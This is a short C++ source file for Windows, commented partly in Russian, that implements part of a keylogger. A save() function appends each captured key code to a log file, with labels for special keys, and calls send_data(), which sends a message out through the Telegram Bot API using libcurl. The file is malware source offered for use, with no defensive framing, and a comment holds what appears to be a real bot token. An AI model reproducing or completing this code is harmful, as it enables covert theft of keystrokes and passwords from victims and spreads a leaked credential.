#include <iostream>
#include <windows.h>
#include <curl/curl.h>
using namespace std;

// 6568906694:AAHjvKcG3NiiycRMau8uMN-Bb71OZ_LYVmU

void send_data(){
    const std::string token = "BOT_TOKEN"; // TOKEN OF YOUR BOT
    const std::string chatId = "USER_ID"; // ID user 
    const std::string message = "TEST DATA";
    
    // URL for send POST-request to TELEGRAM BOT API
    const std::string url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + message;

    // Initialization  cURL 
    CURL * curl = curl_easy_init();
    if (curl) {
        // Установка URL для запроса
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        // Выполнение запроса
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK)
            std::cerr << "Error: " << curl_easy_strerror(res) << std::endl;
        // Освобождение ресурсов
        curl_easy_cleanup(curl);
    }

}

int save(int _key, char *file){
   send_data();
   cout << _key << endl; // Вывод числа  
   Sleep(10); // ожидание
   FILE *OUTPUT_FILE; // Создаём переменную для записи в файл   
   OUTPUT_FILE = fopen(file, "a+");  // Создаём файл(log.txt)
   // Далее мы смотрим, нажаты ли спец. клавиши и обрабатываем их
   if (_key == VK_SHIFT)
      fprintf(OUTPUT_FILE, "%s", "[SHIFT]");      
   else if (_key == VK_BACK)
      fprintf(OUTPUT_FILE, "%s", "[BACK]");  
   else if (_key == VK_LBUTTON)  
      fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");     
   else if (_key == VK_RETURN)  
      fprintf(OUTPUT_FILE, "%s", "[RETURN]\n");      
   else if (_key == VK_ESCAPE)  
      fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");     
   else // Если ничего не подошло, то просто записываем клавишу
      fprintf(OUTPUT_FILE, "%s", &_key);
      
   fclose(OUTPUT_FILE); // Закрываем файл
   
   return 0; // Возвращаем 0
}